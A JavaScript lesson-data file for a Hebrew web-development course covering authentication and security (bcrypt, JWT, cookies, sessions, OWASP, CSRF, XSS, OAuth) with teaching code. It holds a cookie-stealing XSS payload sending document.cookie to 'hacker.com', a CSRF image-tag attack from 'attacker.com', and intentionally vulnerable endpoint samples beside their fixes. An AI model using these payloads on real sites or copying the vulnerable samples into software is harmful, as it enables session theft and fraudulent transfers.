// data/lesson09.js — שיעור 09: אימות ואבטחה — JWT, Cookies, Sessions
// קריטי למבחן. חברת hi-tech לא תקבל מועמד שלא מבין JWT vs Sessions.
var LESSON_09 = {
  id: "lesson_09",
  title: "שיעור 09 — אימות ואבטחה: JWT, Cookies, Sessions",
  description:
    "מנגנוני אימות מודרניים: bcrypt, JWT, Sessions, Cookies, OWASP Top 10 הנפוצים.",
  concepts: [
    {
      conceptName: "Authentication",
      difficulty: 4,
      levels: {
        grandma:
          "אימות = להוכיח מי אתה. כמו בכניסה לבניין — מציגים תעודת זהות לשומר.",
        child:
          "כמו לסיסמת הסוד של 'מועדון הסודות' — רק מי שיודע נכנס.",
        soldier:
          "Authentication = בדיקת זהות. בעולם web: שם משתמש + סיסמה (עכשיו) → token (אחר כך).",
        student:
          "Authentication (אימות) ≠ Authorization (הרשאה). Auth = מי אתה. Authz = מה מותר לך לעשות. Auth קודם.",
        junior:
          "פעם בלבלתי בין auth ל-authz ב-API שלי — שמתי is-admin בתוך JWT. מתחיל גנב את הטוקן וקיבל גישה. הפרדה נכונה: Auth=מי, Authz=נבדק בכל endpoint.",
        professor:
          "Auth flow: identification → verification → token issuance → session establishment. Standards: OAuth 2.0, OpenID Connect, SAML. Multi-factor (MFA) = something you know + have + are.",
      },
      illustration:
        "🔐 Auth flow:\n\n  1. POST /login {email, password}\n  2. Server: bcrypt.compare(pw, hashedPw)\n  3. ✅ → JWT issued\n  4. Client: stores JWT\n  5. כל בקשה: Authorization: Bearer <jwt>",
      codeExample:
        "// Login endpoint (Express)\n" +
        "app.post('/login', async (req, res) => {\n" +
        "  const { email, password } = req.body;\n" +
        "  const user = await User.findOne({ email });\n" +
        "  if (!user) return res.status(401).json({ error: 'Invalid' });\n" +
        "  const ok = await bcrypt.compare(password, user.passwordHash);\n" +
        "  if (!ok) return res.status(401).json({ error: 'Invalid' });\n" +
        "  const token = jwt.sign({ userId: user._id }, SECRET, { expiresIn: '7d' });\n" +
        "  res.json({ token });\n" +
        "});",
      codeExplanation:
        "מאמתים email+password עם bcrypt.compare. אם נכון — מנפיקים JWT עם userId ו-expiry של 7 ימים.",
      commonMistakes:
        "1) להחזיר שגיאות שונות לאימייל לא קיים vs סיסמה שגויה — חושף enumeration attack. 2) לא ל-hash סיסמה. 3) לשמור סיסמה בלוג.",
    },
    {
      conceptName: "Password Hashing",
      difficulty: 5,
      levels: {
        grandma:
          "במקום לשמור את הסיסמה, שומרים גרסה מעורבלת ומובללת. גם אם פורצים — לא יודעים מה הסיסמה.",
        child:
          "כמו לשמור פאזל מפורק במקום התמונה. אי אפשר לראות מה היה — אבל אפשר לבדוק אם פאזל אחר תואם.",
        soldier:
          "bcrypt = פונקציה חד-כיוונית עם salt. אי אפשר להפוך בחזרה. אפשר רק לבדוק: hash(input) === stored?",
        student:
          "bcrypt(password, saltRounds=10) → $2b$10$... (60 chars). compare(input, hash) מבצעת hash על input + מאפסת ב-constant time למניעת timing attacks.",
        junior:
          "פעם השתמשתי ב-md5 לסיסמאות (לפני שידעתי). תוך שבוע, באג חשף את ה-DB ו-100% מהסיסמאות נשברו ב-rainbow tables. עכשיו: bcrypt תמיד, saltRounds≥10.",
        professor:
          "bcrypt משתמש ב-Blowfish-based KDF עם adaptive cost. saltRounds=10 → 2^10 = 1024 iterations. argon2id (newer) עדיף, מנצח memory-hard attacks (GPU/ASIC).",
      },
      illustration:
        "🔒 bcrypt flow:\n\n  password='Hello123'\n  + salt='$2b$10$randomXXXXX'\n  → hash='$2b$10$randomXXXXXabcdef...'\n\n  אי אפשר להפוך — רק להשוות.",
      codeExample:
        "const bcrypt = require('bcrypt');\n\n" +
        "// Hash on signup:\n" +
        "const hashedPw = await bcrypt.hash(password, 10);\n" +
        "await User.create({ email, passwordHash: hashedPw });\n\n" +
        "// Verify on login:\n" +
        "const isMatch = await bcrypt.compare(password, user.passwordHash);",
      codeExplanation:
        "hash בעת הרשמה (saltRounds=10). compare בעת login. שמירת ה-hash ב-DB, לעולם לא הסיסמה.",
      commonMistakes:
        "1) saltRounds<10 — מהיר מדי, brute-force אפשרי. 2) שימוש ב-md5/sha256 — אין salt, rainbow tables. 3) bcrypt sync ב-Node main thread → blocking.",
    },
    {
      conceptName: "JWT",
      difficulty: 6,
      levels: {
        grandma:
          "JWT = תעודת זהות חתומה דיגיטלית. הלקוח שומר אותה, ובכל בקשה מציג אותה. השרת בודק את החתימה.",
        child:
          "כמו תווית קעקוע על היד מ'מועדון הסודות' — מראים אותה ונכנסים בלי שאלות.",
        soldier:
          "JWT = JSON Web Token. 3 חלקים: header.payload.signature. הכל base64. הלקוח שולח Authorization: Bearer <jwt>.",
        student:
          "JWT structure: header (alg, typ) . payload (claims: sub, exp, custom) . signature (HMAC/RSA). השרת מאמת את ה-signature; אם מתאים → מאמין ל-payload.",
        junior:
          "פעם שמתי is_admin בתוך payload — והגעתי לבעיה: כשהפכתי משתמש ל-admin, ה-JWT הישן עדיין הציג false. עכשיו: JWT רק ל-userId. בכל endpoint שדורש admin, אני בודק ב-DB.",
        professor:
          "JWT (RFC 7519): self-contained, stateless. Algorithms: HS256 (symmetric), RS256 (asymmetric, scalable). Storage tradeoff: localStorage (XSS risk) vs httpOnly cookie (CSRF risk, mitigate w/ SameSite). expires: short-lived access + long-lived refresh.",
      },
      illustration:
        "🎟️ JWT structure:\n\n  eyJhbGciOiJIUzI1NiI... ← header\n  .eyJ1c2VySWQiOiIxMjMi... ← payload\n  .SflKxwRJSMeKKF2QT... ← signature\n\n  base64url(header) + . + base64url(payload) + . + signature",
      codeExample:
        "const jwt = require('jsonwebtoken');\n\n" +
        "// Sign:\n" +
        "const token = jwt.sign(\n" +
        "  { userId: user._id, email: user.email },\n" +
        "  process.env.JWT_SECRET,\n" +
        "  { expiresIn: '15m' }\n" +
        ");\n\n" +
        "// Verify (middleware):\n" +
        "function authMiddleware(req, res, next) {\n" +
        "  const auth = req.headers.authorization;\n" +
        "  if (!auth?.startsWith('Bearer ')) return res.status(401).end();\n" +
        "  try {\n" +
        "    req.user = jwt.verify(auth.slice(7), process.env.JWT_SECRET);\n" +
        "    next();\n" +
        "  } catch (e) {\n" +
        "    res.status(401).json({ error: 'Invalid token' });\n" +
        "  }\n" +
        "}",
      codeExplanation:
        "sign יוצר JWT עם payload + secret + expiry. verify בודק חתימה ו-expiry, מחזיר את ה-payload או זורק.",
      commonMistakes:
        "1) JWT_SECRET חלש — נשבר במחשב ביתי. 2) expiry ארוך → גנב משתמש זמן רב. 3) שמירה ב-localStorage → XSS חושף. 4) is_admin בתוך JWT → לא מתעדכן עד expiry.",
    },
    {
      conceptName: "Cookie",
      difficulty: 4,
      levels: {
        grandma:
          "פתק קטן שהאתר מכניס לדפדפן שלך — שיזהה אותך כשתחזרי.",
        child:
          "כמו לקבל תווית עם השם בכניסה לקייטנה — בכל פעם שאתה חוזר, יודעים מי אתה.",
        soldier:
          "Cookie = name=value שנשלח ב-HTTP header. הדפדפן שולח אותו אוטומטית בכל בקשה לאותו דומיין.",
        student:
          "Set-Cookie: name=value; HttpOnly; Secure; SameSite=Strict; Max-Age=86400. הדפדפן שומר ושולח אוטומטית. לעומת localStorage — נשלח בכל בקשה (גודל מוגבל ל-4KB).",
        junior:
          "התחלתי עם JWT ב-localStorage — XSS חשף את כל ה-tokens. עברתי ל-httpOnly cookie + CSRF token + SameSite=Strict. עכשיו ה-XSS לא יכול לקרוא, וה-CSRF protection מהקוקי.",
        professor:
          "Cookie attributes: HttpOnly (אין גישת JS), Secure (HTTPS only), SameSite (Strict/Lax/None), Domain, Path, Max-Age. SameSite=Strict חוסם CSRF ב-default. Browser sends per request — מהווה state-ful לעומת stateless tokens.",
      },
      illustration:
        "🍪 Cookie attributes:\n\n  Set-Cookie: token=abc123;\n    HttpOnly      ← אין גישת JS\n    Secure        ← HTTPS only\n    SameSite=Strict ← אין CSRF\n    Max-Age=3600  ← פג בעוד שעה",
      codeExample:
        "// Express — set cookie\n" +
        "res.cookie('token', jwtToken, {\n" +
        "  httpOnly: true,\n" +
        "  secure: process.env.NODE_ENV === 'production',\n" +
        "  sameSite: 'strict',\n" +
        "  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ימים\n" +
        "});\n\n" +
        "// Read cookie (with cookie-parser middleware)\n" +
        "const token = req.cookies.token;",
      codeExplanation:
        "httpOnly מונע גישת JS (XSS protection). secure רק ב-HTTPS. sameSite=strict מונע CSRF. maxAge ב-ms.",
    },
    {
      conceptName: "Session",
      difficulty: 5,
      levels: {
        grandma:
          "כל פעם שאת מתחברת — האתר זוכר אותך עד שתסגרי או שתעבור הזמן. זה ה-session.",
        child:
          "כשאתה משחק במשחק — המצב נשמר עד שתסיים. זה ה-session.",
        soldier:
          "Session = state בצד השרת המזוהה ב-sessionId (cookie). שונה מ-JWT שהוא stateless.",
        student:
          "Session-based auth: שרת שומר user state ב-Redis/DB עם session_id key. הלקוח שולח רק את ה-session_id (cookie). לעומת JWT — stateful, אפשר לבטל מיד.",
        junior:
          "התחלתי עם JWT (פופולרי, stateless). הסתבכתי כשהיה צריך לבטל token (logout, revoke). עברתי ל-sessions בפרויקט הבא — קל יותר ב-CRUD פשוט. JWT עדיף ל-microservices.",
        professor:
          "Session vs JWT: stateful vs stateless. Sessions: easier revocation, server load (Redis), good for monolith. JWT: scalable (no DB lookup), distributed systems, harder to revoke. Pattern: short-JWT + refresh-token + sliding session.",
      },
      illustration:
        "📋 Session vs JWT:\n\n  Session: client→cookie(sessId)→server→Redis lookup→user\n  JWT:     client→header(jwt)→server→verify+extract→user (no DB)",
      codeExample:
        "// Express — express-session\n" +
        "const session = require('express-session');\n" +
        "const RedisStore = require('connect-redis').default;\n\n" +
        "app.use(session({\n" +
        "  store: new RedisStore({ client: redisClient }),\n" +
        "  secret: process.env.SESSION_SECRET,\n" +
        "  resave: false,\n" +
        "  saveUninitialized: false,\n" +
        "  cookie: { httpOnly: true, secure: true, maxAge: 86400000 }\n" +
        "}));\n\n" +
        "// Use:\n" +
        "req.session.userId = user._id;  // login\n" +
        "delete req.session.userId;      // logout",
      codeExplanation:
        "express-session עם Redis store. secret חתימת cookie. login = שמירת userId, logout = מחיקה. Redis אחראי לתפוגה.",
    },
    {
      conceptName: "OWASP Top 10",
      difficulty: 8,
      levels: {
        grandma:
          "10 הסיכונים הכי מסוכנים באתרים — רשימה לוגית למפתחים מה לבדוק.",
        child:
          "10 הטעויות הגרועות שמפתחים עושים שגורמות לפריצות.",
        soldier:
          "OWASP Top 10 (2021): Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfig, Vulnerable Components, ID&Auth Failures, Software/Data Integrity, Logging Failures, SSRF.",
        student:
          "Open Web Application Security Project. עדכון אחרון 2021. הקטגוריה הראשונה (Broken Access Control) הקיצונית — 94% מהאפליקציות לוקה בה.",
        junior:
          "פעם בניתי endpoint /api/user/:id — שכחתי לבדוק שה-userId מ-JWT שווה לפרמטר. גנב יכל לקבל פרטי כל משתמש (IDOR). זה היה Broken Access Control. עכשיו תמיד `if (req.user.id !== params.id) return 403`.",
        professor:
          "OWASP Top 10 הוא awareness document, לא דרישת רגולציה. מקיף Web only (לא mobile/iot). השלמה: ASVS (Application Security Verification Standard) + SAMM (maturity model).",
      },
      illustration:
        "🛡️ OWASP Top 10 (2021):\n\n" +
        "  A01 Broken Access Control\n" +
        "  A02 Cryptographic Failures\n" +
        "  A03 Injection (SQL, NoSQL, OS)\n" +
        "  A04 Insecure Design\n" +
        "  A05 Security Misconfig\n" +
        "  A06 Vulnerable Components\n" +
        "  A07 Auth Failures\n" +
        "  A08 Data Integrity\n" +
        "  A09 Logging Failures\n" +
        "  A10 SSRF",
      codeExample:
        "// ❌ Broken Access Control (IDOR)\n" +
        "app.get('/api/users/:id', auth, async (req, res) => {\n" +
        "  const user = await User.findById(req.params.id);\n" +
        "  res.json(user);  // כל אחד יכול לראות כל משתמש!\n" +
        "});\n\n" +
        "// ✅ תיקון:\n" +
        "app.get('/api/users/:id', auth, async (req, res) => {\n" +
        "  if (req.user.id !== req.params.id && !req.user.isAdmin) {\n" +
        "    return res.status(403).json({ error: 'Forbidden' });\n" +
        "  }\n" +
        "  const user = await User.findById(req.params.id);\n" +
        "  res.json(user);\n" +
        "});",
      codeExplanation:
        "השכבה הראשונה (auth middleware) רק בודקת שמחובר. השכבה השנייה (req.user.id check) בודקת שהוא יכול לגשת לדף הזה.",
      commonMistakes:
        "1) Auth middleware בלבד = יכול לראות נתוני אחרים. 2) frontend hides admin button = backend לא מאמת = לחיצה ישירה ל-API. 3) `IDOR` (Insecure Direct Object Reference) = שינוי URL מ-/users/123 ל-/users/124.",
    },
    {
      conceptName: "CSRF",
      difficulty: 7,
      levels: {
        grandma:
          "CSRF = להונות אותך לבצע פעולה באתר אחר בלי לדעת. כמו שמישהו מציע לך לחתום על נייר 'תמים' — אבל באמת זה צ'ק.",
        child:
          "תוקף יוצר 'משחק' עם כפתור 'לחץ', וכשאתה לוחץ — באמת שלחת בקשה לאתר הבנק שלך.",
        soldier:
          "CSRF = Cross-Site Request Forgery. דף תוקף שולח בקשה לדומיין שלך עם הקוקיז של המשתמש. Cookie נשלח אוטומטית — אבל הבקשה לא לגיטימית.",
        student:
          "התקפה על אתרים שמשתמשים ב-cookies לאימות. הגנה: SameSite=Strict cookie + CSRF token (synchronizer pattern) + Origin/Referer check.",
        junior:
          "באתר שלי היה /api/transfer. תוקף שלח לי קישור 'תראה את המאמר!' — בעצם דף שב-load יזם POST ל-/api/transfer. הכסף עבר. הוספתי SameSite=Strict ו-CSRF token — נפתר.",
        professor:
          "CSRF mitigation strategies: SameSite=Strict (browser-level), Synchronizer Token (per-request token validated server-side), Double Submit Cookie, Origin/Referer header validation. Top defense: SameSite=Strict + token.",
      },
      illustration:
        "🦹 CSRF attack:\n\n  attacker.com:\n    <img src=\"bank.com/transfer?to=attacker&amount=1000\" />\n  \n  המשתמש פותח attacker.com (מחובר ל-bank.com)\n  → דפדפן שולח אוטומטית עם הקוקיז\n  → הכסף הועבר!",
      codeExample:
        "// ❌ Vulnerable to CSRF\n" +
        "app.post('/api/transfer', auth, (req, res) => {\n" +
        "  transferMoney(req.user.id, req.body.to, req.body.amount);\n" +
        "  res.json({ ok: true });\n" +
        "});\n\n" +
        "// ✅ Protected: CSRF token + SameSite=Strict cookie\n" +
        "app.post('/api/transfer', auth, csrfProtection, (req, res) => {\n" +
        "  // csrfProtection middleware verifies _csrf token in body/header\n" +
        "  transferMoney(req.user.id, req.body.to, req.body.amount);\n" +
        "  res.json({ ok: true });\n" +
        "});",
      codeExplanation:
        "csrfProtection middleware (csurf package) מצפה ל-_csrf token בכל non-GET. הטוקן נשלח עם ה-form/header ולא ב-cookie.",
    },
    {
      conceptName: "XSS",
      difficulty: 7,
      levels: {
        grandma:
          "תוקף מצליח להזריק 'דפי קוד' לאתר שלך — ומקבל מידע על המשתמשים.",
        child:
          "כתבת ב-comment <script>גנב את הסיסמה</script> וכשמישהו פותח את הקומנט — הסקריפט רץ אצלו.",
        soldier:
          "XSS = Cross-Site Scripting. התוקף מזריק <script> שרץ בדפדפן של קורבן. מטרה: גניבת cookies, session hijack.",
        student:
          "3 סוגים: Stored (ב-DB), Reflected (ב-URL/form), DOM-based (frontend מאניפול ה-DOM ללא escaping). הגנה: escape כל input מהמשתמש.",
        junior:
          "פעם הצגתי `<div>{userBio}</div>` ב-React — React escape אוטומטית, בטוח. אבל אז עברתי ל-`dangerouslySetInnerHTML` כדי לתמוך ב-bold — XSS תוך שעה. עכשיו: DOMPurify לכל HTML מהמשתמש.",
        professor:
          "Defense in depth: Output encoding (context-aware: HTML, attribute, JS, CSS), CSP (Content-Security-Policy header), Trusted Types (TC39 proposal), HttpOnly cookies (mitigates session theft).",
      },
      illustration:
        "💉 XSS attack:\n\n  comment field: <script>fetch('hacker.com?c=' + document.cookie)</script>\n  → שמור ב-DB\n  → כל מי שצופה — שולח cookies לתוקף",
      codeExample:
        "// ❌ Vulnerable\n" +
        "app.get('/profile/:id', async (req, res) => {\n" +
        "  const user = await User.findById(req.params.id);\n" +
        "  res.send(`<h1>שלום ${user.name}</h1>`);  // XSS!\n" +
        "});\n\n" +
        "// ✅ Escaped (with template engine)\n" +
        "app.get('/profile/:id', async (req, res) => {\n" +
        "  const user = await User.findById(req.params.id);\n" +
        "  res.render('profile', { user });  // Pug/EJS escape אוטומטית\n" +
        "});\n\n" +
        "// ✅ React (auto-escape)\n" +
        "<h1>שלום {user.name}</h1>  // בטוח!\n\n" +
        "// ⚠️ React + HTML מהמשתמש\n" +
        "import DOMPurify from 'dompurify';\n" +
        "<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }} />",
      codeExplanation:
        "Template engines escape אוטומטית. React גם. אבל dangerouslySetInnerHTML דורש sanitization (DOMPurify).",
    },
    {
      conceptName: "Refresh Token",
      difficulty: 7,
      levels: {
        grandma:
          "JWT קצר חיים (15 דקות). כשפג — מציגים את ה-refresh token ומקבלים JWT חדש בלי לעשות login מחדש.",
        child:
          "כמו תווית יומית למוזיאון: כל בוקר נכנס לכרטיסייה ומקבל תווית חדשה.",
        soldier:
          "2 tokens: Access (קצר, 15 דק) + Refresh (ארוך, 30 ימים, httpOnly cookie). אם access פג — שולחים refresh ל-/refresh ומקבלים access חדש.",
        student:
          "Refresh token pattern: יותר אבטחה (access קצר → גנב מצומצם), יותר UX (אין login אחרי 15 דק). Refresh נשמר server-side; rotation בכל שימוש.",
        junior:
          "פעם שמתי JWT ל-30 ימים — נוח, אבל גנב טוקן יכל לעשות הרבה. עברתי ל-access 15min + refresh httpOnly cookie. גנב access — תקף ל-15 דק. גנב refresh — צריך גם לחדור ל-cookie storage.",
        professor:
          "Token rotation: כל קריאה ל-/refresh מנפיקה refresh חדש (invalidates old). Detection: refresh ישן בשימוש → התקפה → invalidate all tokens for user. Family tracking via refresh_token_id.",
      },
      illustration:
        "🔄 Refresh flow:\n\n  Login → access(15m) + refresh(30d, httpOnly)\n  API call → access. אם 401:\n    → POST /refresh (with cookie)\n    → access חדש + refresh חדש\n    → retry original",
      codeExample:
        "// Login — issue both\n" +
        "app.post('/login', async (req, res) => {\n" +
        "  const user = await authenticate(req.body);\n" +
        "  const access = jwt.sign({ id: user.id }, ACCESS_SECRET, { expiresIn: '15m' });\n" +
        "  const refresh = jwt.sign({ id: user.id }, REFRESH_SECRET, { expiresIn: '30d' });\n" +
        "  await RefreshToken.create({ userId: user.id, token: refresh });\n" +
        "  res.cookie('refresh', refresh, { httpOnly: true, secure: true, sameSite: 'strict' })\n" +
        "     .json({ access });\n" +
        "});\n\n" +
        "// Refresh\n" +
        "app.post('/refresh', async (req, res) => {\n" +
        "  const refresh = req.cookies.refresh;\n" +
        "  const stored = await RefreshToken.findOne({ token: refresh });\n" +
        "  if (!stored) return res.status(401).end();\n" +
        "  jwt.verify(refresh, REFRESH_SECRET);\n" +
        "  const access = jwt.sign({ id: stored.userId }, ACCESS_SECRET, { expiresIn: '15m' });\n" +
        "  res.json({ access });\n" +
        "});",
      codeExplanation:
        "Login מפיק שניים. Refresh בלבד ב-httpOnly cookie. /refresh מאמת את ה-cookie + DB lookup ומפיק access חדש.",
    },
    {
      conceptName: "OAuth 2.0",
      difficulty: 8,
      levels: {
        grandma:
          "במקום להיכנס לאתר עם סיסמה חדשה — להיכנס עם 'התחבר עם Google'. Google אישר שזה אתה, האתר מאמין.",
        child:
          "כמו להראות תעודת זהות ממשרד הפנים — האתר לא צריך לבדוק לבד.",
        soldier:
          "OAuth 2.0 = פרוטוקול delegation. המשתמש נותן הרשאה לאפליקציה לפנות ל-API שלו (Google, Facebook) בלי לתת סיסמה.",
        student:
          "OAuth 2.0 flow: Authorization Code Grant (web), Implicit (deprecated), Resource Owner Password (legacy), Client Credentials (machine), Device Code (TVs). Web modern: Auth Code + PKCE.",
        junior:
          "התחלתי עם 'התחבר עם Google' באתר שלי דרך Auth Code flow. השרת שלי מקבל code, ממיר לאסימון אצל Google, מקבל פרטי משתמש. המשתמש לא מסר סיסמה — רק אישר ל-Google.",
        professor:
          "RFC 6749 (OAuth 2.0) + RFC 7636 (PKCE). Components: Resource Owner, Client, Authorization Server, Resource Server. Tokens: Access, Refresh, ID (OIDC). Best practice today: Auth Code Grant + PKCE for SPAs.",
      },
      illustration:
        "🔗 OAuth 2.0 (Auth Code Flow):\n\n  1. אתר שולח: redirect ל-Google /authorize\n  2. משתמש מאשר ב-Google\n  3. Google מחזיר code לאתר\n  4. אתר מחליף code ל-access_token (server-side)\n  5. אתר משתמש ב-token לקבלת user info",
      codeExample:
        "// Express + Passport.js — Google OAuth\n" +
        "const passport = require('passport');\n" +
        "const GoogleStrategy = require('passport-google-oauth20').Strategy;\n\n" +
        "passport.use(new GoogleStrategy({\n" +
        "  clientID: process.env.GOOGLE_ID,\n" +
        "  clientSecret: process.env.GOOGLE_SECRET,\n" +
        "  callbackURL: '/auth/google/callback'\n" +
        "}, async (accessToken, refreshToken, profile, done) => {\n" +
        "  const user = await User.findOrCreate({ googleId: profile.id });\n" +
        "  done(null, user);\n" +
        "}));\n\n" +
        "app.get('/auth/google', passport.authenticate('google', { scope: ['profile', 'email'] }));\n" +
        "app.get('/auth/google/callback', passport.authenticate('google'), (req, res) => res.redirect('/dashboard'));",
      codeExplanation:
        "Passport מאקסטרקט את ה-OAuth complexity. הקלאינט מועבר ל-Google, אחרי הסכמה חוזר עם code, Passport ממיר ל-token + מציאה משתמש.",
    },
  ],
};
